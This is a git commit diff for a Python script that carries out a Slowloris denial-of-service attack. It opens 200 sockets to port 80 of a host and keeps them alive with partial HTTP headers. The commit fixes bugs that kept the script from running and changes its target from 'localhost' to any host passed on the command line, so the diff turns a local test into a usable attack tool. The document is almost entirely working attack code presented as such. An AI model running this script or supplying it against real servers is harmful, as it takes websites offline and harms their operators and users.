bf08e7ba0809963bb9a106246c95740d74d67201
masjohncook <mas.john.cook@gmail.com>
2022-02-25 11:09:55 +0800

    feat - update the local_slowloris.py

--- test.py
+++ test.py
@@ -1,23 +1,18 @@
 #!/usr/bin/env python
 
-import socket
-import random
-import time
-import sys
+import socket, random, time, sys
 
-
-# HTTP Request messages
-header = [
+headers = [
     "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
     "Accept-language: en-US,en"
 ]
 
 sockets = []
 
-def socketInitialization(host):
+def setupSocket(ip):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(4)
-    sock.connect((host, 80))
+    sock.connect((ip, 80))
     sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 1337)).encode("utf-8"))
 
     for header in headers:
@@ -25,22 +20,23 @@ def socketInitialization(host):
 
     return sock
 
-
 if __name__ == "__main__":
+    if len(sys.argv) != 2:
+        print("Use it like this: python {} example.com".format(sys.argv[0]))
+        sys.exit()
 
-    host = 'localhost'
+    ip = sys.argv[1]
     count = 200
-
-    print("Starting DoS Attack on {}. Connecting to {} socket".format(host, count))
+    print("Starting DoS attack on {}. Connecting to {} sockets.".format(ip, count))
 
     for _ in range(count):
         try:
             print("Socket {}".format(_))
-            sock = setupSocket(host)
+            sock = setupSocket(ip)
         except socket.error:
             break
 
-        socket.append(sock)
+        sockets.append(sock)
 
     while True:
         print("Connected to {} sockets. Sending headers...".format(len(sockets)))
@@ -54,11 +50,10 @@ if __name__ == "__main__":
         for _ in range(count - len(sockets)):
             print("Re-opening closed sockets...")
             try:
-                sock = setupSocket(host)
+                sock = setupSocket(ip)
                 if sock:
                     sockets.append(sock)
             except socket.error:
                 break
 
         time.sleep(15)
-
